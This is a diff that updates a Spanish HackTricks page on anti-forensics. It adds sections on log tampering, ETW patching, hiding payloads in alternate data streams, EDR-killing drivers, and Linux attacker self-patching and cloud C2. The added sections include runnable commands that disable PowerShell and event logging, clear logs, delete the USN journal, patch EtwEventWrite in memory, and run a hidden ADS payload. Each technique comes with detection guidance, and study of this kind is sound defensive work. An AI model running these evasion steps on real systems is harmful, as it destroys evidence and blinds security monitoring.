@@ -2,14 +2,14 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Timestamps
+## Tiempos
 
 Un atacante puede estar interesado en **cambiar las marcas de tiempo de los archivos** para evitar ser detectado.\
 Es posible encontrar las marcas de tiempo dentro del MFT en los atributos `$STANDARD_INFORMATION` \_\_ y \_\_ `$FILE_NAME`.
 
 Ambos atributos tienen 4 marcas de tiempo: **Modificación**, **acceso**, **creación** y **modificación del registro MFT** (MACE o MACB).
 
-**Windows explorer** y otras herramientas muestran la información de **`$STANDARD_INFORMATION`**.
+**Explorador de Windows** y otras herramientas muestran la información de **`$STANDARD_INFORMATION`**.
 
 ### TimeStomp - Herramienta anti-forense
 
@@ -42,11 +42,11 @@ Usando la misma herramienta es posible identificar **a qué hora se modificaron 
 
 ### Comparación de `$STANDARD_INFORMATION` y `$FILE_NAME`
 
-Otra forma de identificar archivos modificados sospechosos sería comparar el tiempo en ambos atributos buscando **incongruencias**.
+Otra forma de identificar archivos modificados sospechosos sería comparar el tiempo en ambos atributos buscando **inconsistencias**.
 
 ### Nanosegundos
 
-Las marcas de tiempo de **NTFS** tienen una **precisión** de **100 nanosegundos**. Por lo tanto, encontrar archivos con marcas de tiempo como 2010-10-10 10:10:**00.000:0000 es muy sospechoso**.
+Las marcas de tiempo de **NTFS** tienen una **precisión** de **100 nanosegundos**. Entonces, encontrar archivos con marcas de tiempo como 2010-10-10 10:10:**00.000:0000 es muy sospechoso**.
 
 ### SetMace - Herramienta anti-forense
 
@@ -54,13 +54,13 @@ Esta herramienta puede modificar ambos atributos `$STARNDAR_INFORMATION` y `$FIL
 
 ## Ocultamiento de Datos
 
-NFTS utiliza un clúster y el tamaño mínimo de información. Eso significa que si un archivo ocupa un clúster y medio, la **mitad restante nunca se utilizará** hasta que se elimine el archivo. Entonces, es posible **ocultar datos en este espacio de holgura**.
+NFTS utiliza un clúster y el tamaño mínimo de información. Eso significa que si un archivo ocupa y utiliza un clúster y medio, la **mitad restante nunca se va a utilizar** hasta que se elimine el archivo. Entonces, es posible **ocultar datos en este espacio de relleno**.
 
 Hay herramientas como slacker que permiten ocultar datos en este espacio "oculto". Sin embargo, un análisis del `$logfile` y `$usnjrnl` puede mostrar que se añadieron algunos datos:
 
 ![](<../../images/image (1060).png>)
 
-Entonces, es posible recuperar el espacio de holgura usando herramientas como FTK Imager. Tenga en cuenta que este tipo de herramienta puede guardar el contenido ofuscado o incluso cifrado.
+Entonces, es posible recuperar el espacio de relleno usando herramientas como FTK Imager. Tenga en cuenta que este tipo de herramienta puede guardar el contenido ofuscado o incluso cifrado.
 
 ## UsbKill
 
@@ -77,7 +77,7 @@ Estas distribuciones se **ejecutan dentro de la memoria RAM**. La única forma d
 
 ## Configuración de Windows
 
-Es posible deshabilitar varios métodos de registro de Windows para dificultar mucho la investigación forense.
+Es posible deshabilitar varios métodos de registro de Windows para hacer que la investigación forense sea mucho más difícil.
 
 ### Deshabilitar Marcas de Tiempo - UserAssist
 
@@ -123,7 +123,7 @@ También puede eliminarlas a través de la GUI siguiendo los pasos propuestos en
 
 Para deshabilitar las copias de sombra [pasos desde aquí](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):
 
-1. Abra el programa Servicios escribiendo "services" en el cuadro de búsqueda de texto después de hacer clic en el botón de inicio de Windows.
+1. Abra el programa de Servicios escribiendo "services" en el cuadro de búsqueda de texto después de hacer clic en el botón de inicio de Windows.
 2. En la lista, busque "Copia de Sombra de Volumen", selecciónelo y luego acceda a Propiedades haciendo clic derecho.
 3. Elija Deshabilitado en el menú desplegable "Tipo de inicio" y luego confirme el cambio haciendo clic en Aplicar y Aceptar.
 
@@ -142,12 +142,155 @@ También es posible modificar la configuración de qué archivos se van a copiar
 
 ### Deshabilitar registros de eventos de Windows
 
-- `reg add 'HKLM\SYSTEM\CurrentControlSet\Services\eventlog' /v Start /t REG_DWORD /d 4 /f`
-- Dentro de la sección de servicios, deshabilite el servicio "Registro de Eventos de Windows"
+- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
+- Dentro de la sección de servicios deshabilitar el servicio "Registro de Eventos de Windows"
 - `WEvtUtil.exec clear-log` o `WEvtUtil.exe cl`
 
 ### Deshabilitar $UsnJrnl
 
 - `fsutil usn deletejournal /d c:`
+
+---
+
+## Registro Avanzado y Manipulación de Trazas (2023-2025)
+
+### Registro de ScriptBlock/Module de PowerShell
+
+Las versiones recientes de Windows 10/11 y Windows Server mantienen **ricos artefactos forenses de PowerShell** bajo
+`Microsoft-Windows-PowerShell/Operational` (eventos 4104/4105/4106).
+Los atacantes pueden deshabilitarlos o borrarlos sobre la marcha:
+```powershell
+# Turn OFF ScriptBlock & Module logging (registry persistence)
+New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
+-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
+New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
+-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force
+
+# In-memory wipe of recent PowerShell logs
+Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
+Remove-WinEvent               # requires admin & Win11 23H2+
+```
+Los defensores deben monitorear los cambios en esas claves del registro y la eliminación de eventos de PowerShell de alto volumen.
+
+### Parche ETW (Event Tracing for Windows)
+
+Los productos de seguridad de endpoints dependen en gran medida de ETW. Un método de evasión popular en 2024 es parchear `ntdll!EtwEventWrite`/`EtwEventWriteFull` en memoria para que cada llamada a ETW devuelva `STATUS_SUCCESS` sin emitir el evento:
+```c
+// 0xC3 = RET on x64
+unsigned char patch[1] = { 0xC3 };
+WriteProcessMemory(GetCurrentProcess(),
+GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
+patch, sizeof(patch), NULL);
+```
+Public PoCs (por ejemplo, `EtwTiSwallow`) implementan la misma primitiva en PowerShell o C++.  
+Debido a que el parche es **local al proceso**, los EDR que se ejecutan dentro de otros procesos pueden pasarlo por alto.  
+Detección: comparar `ntdll` en memoria vs. en disco, o enganchar antes del modo de usuario.
+
+### Revitalización de Flujos de Datos Alternativos (ADS)
+
+Se han observado campañas de malware en 2023 (por ejemplo, cargadores **FIN12**) que han estado colocando binarios de segunda etapa dentro de ADS para mantenerse fuera de la vista de los escáneres tradicionales:
+```cmd
+rem Hide cobalt.bin inside an ADS of a PDF
+type cobalt.bin > report.pdf:win32res.dll
+rem Execute directly
+wmic process call create "cmd /c report.pdf:win32res.dll"
+```
+Enumerar flujos con `dir /R`, `Get-Item -Stream *`, o Sysinternals `streams64.exe`. Copiar el archivo de host a FAT/exFAT o a través de SMB eliminará el flujo oculto y puede ser utilizado por los investigadores para recuperar la carga útil.
+
+### BYOVD & “AuKill” (2023)
+
+Bring-Your-Own-Vulnerable-Driver se utiliza ahora rutinariamente para **anti-forensics** en intrusiones de ransomware. La herramienta de código abierto **AuKill** carga un controlador firmado pero vulnerable (`procexp152.sys`) para suspender o terminar los sensores EDR y forenses **antes de la encriptación y destrucción de registros**:
+```cmd
+AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
+AuKill.exe -k CrowdStrike
+```
+El controlador se elimina después, dejando artefactos mínimos.  
+Mitigaciones: habilitar la lista de bloqueo de controladores vulnerables de Microsoft (HVCI/SAC) y alertar sobre la creación de servicios del kernel desde rutas escribibles por el usuario.
+
+---
+
+## Linux Anti-Forensics: Autoparcheo y C2 en la Nube (2023–2025)
+
+### Autoparcheo de servicios comprometidos para reducir la detección (Linux)  
+Los adversarios cada vez más "autoparchean" un servicio justo después de explotarlo para prevenir la re-explotación y suprimir las detecciones basadas en vulnerabilidades. La idea es reemplazar componentes vulnerables con los últimos binarios/JARs legítimos de upstream, de modo que los escáneres informen que el host está parcheado mientras la persistencia y C2 permanecen.
+
+Ejemplo: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)  
+- Después de la explotación, los atacantes obtuvieron JARs legítimos de Maven Central (repo1.maven.org), eliminaron JARs vulnerables en la instalación de ActiveMQ y reiniciaron el broker.  
+- Esto cerró el RCE inicial mientras mantenía otros puntos de apoyo (cron, cambios en la configuración de SSH, implantes C2 separados).
+
+Ejemplo operativo (ilustrativo)
+```bash
+# ActiveMQ install root (adjust as needed)
+AMQ_DIR=/opt/activemq
+cd "$AMQ_DIR"/lib
+
+# Fetch patched JARs from Maven Central (versions as appropriate)
+curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
+curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar
+
+# Remove vulnerable files and ensure the service uses the patched ones
+rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
+ln -sf activemq-client-5.18.3.jar activemq-client.jar
+ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar
+
+# Apply changes without removing persistence
+systemctl restart activemq || service activemq restart
+```
+Forense/caza consejos
+- Revise los directorios de servicios en busca de reemplazos binarios/JAR no programados:
+- Debian/Ubuntu: `dpkg -V activemq` y compare los hashes/rutas de archivos con los espejos del repositorio.
+- RHEL/CentOS: `rpm -Va 'activemq*'`
+- Busque versiones de JAR presentes en el disco que no sean propiedad del gestor de paquetes, o enlaces simbólicos actualizados fuera de banda.
+- Línea de tiempo: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` para correlacionar ctime/mtime con la ventana de compromiso.
+- Historial de shell/telemetría de procesos: evidencia de `curl`/`wget` a `repo1.maven.org` u otros CDNs de artefactos inmediatamente después de la explotación inicial.
+- Gestión de cambios: valide quién aplicó el “parche” y por qué, no solo que una versión parcheada esté presente.
+
+### C2 de servicio en la nube con tokens portadores y stagers anti-análisis
+El comercio observado combinó múltiples rutas C2 de largo recorrido y empaquetado anti-análisis:
+- Cargadores ELF de PyInstaller protegidos por contraseña para dificultar el sandboxing y el análisis estático (por ejemplo, PYZ cifrado, extracción temporal bajo `/_MEI*`).
+- Indicadores: hits de `strings` como `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
+- Artefactos en tiempo de ejecución: extracción a `/tmp/_MEI*` o rutas personalizadas `--runtime-tmpdir`.
+- C2 respaldado por Dropbox utilizando tokens OAuth Bearer codificados.
+- Marcadores de red: `api.dropboxapi.com` / `content.dropboxapi.com` con `Authorization: Bearer <token>`.
+- Cace en proxy/NetFlow/Zeek/Suricata para HTTPS saliente a dominios de Dropbox desde cargas de trabajo de servidor que normalmente no sincronizan archivos.
+- C2 paralelo/respaldo a través de túneles (por ejemplo, Cloudflare Tunnel `cloudflared`), manteniendo el control si un canal es bloqueado.
+- IOCs de host: procesos/unidades `cloudflared`, configuración en `~/.cloudflared/*.json`, saliente 443 a los bordes de Cloudflare.
+
+### Persistencia y “rollback de endurecimiento” para mantener el acceso (ejemplos de Linux)
+Los atacantes a menudo combinan auto-parcheo con rutas de acceso duraderas:
+- Cron/Anacron: ediciones al stub `0anacron` en cada directorio `/etc/cron.*/` para ejecución periódica.
+- Cace:
+```bash
+for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
+grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
+```
+- Rollback de endurecimiento de configuración SSH: habilitar inicios de sesión de root y alterar shells predeterminados para cuentas de bajo privilegio.
+- Cace para habilitar inicios de sesión de root:
+```bash
+grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
+# valores de bandera como "yes" o configuraciones excesivamente permisivas
+```
+- Cace para shells interactivas sospechosas en cuentas del sistema (por ejemplo, `games`):
+```bash
+awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
+```
+- Artefactos de beacon aleatorios y de nombre corto (8 caracteres alfabéticos) dejados en el disco que también contactan C2 en la nube:
+- Cace:
+```bash
+find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
+-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
+```
+
+Los defensores deben correlacionar estos artefactos con la exposición externa y los eventos de parcheo de servicios para descubrir la auto-remediación anti-forense utilizada para ocultar la explotación inicial.
+
+## Referencias
+
+- Sophos X-Ops – “AuKill: Un controlador vulnerable armado para deshabilitar EDR” (marzo de 2023)
+https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr
+- Red Canary – “Parcheando EtwEventWrite para sigilo: Detección y Caza” (junio de 2024)
+https://redcanary.com/blog/etw-patching-detection
+
+- [Red Canary – Parcheando para persistencia: Cómo el malware DripDropper de Linux se mueve a través de la nube](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
+- [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
 
 {{#include ../../banners/hacktricks-training.md}}
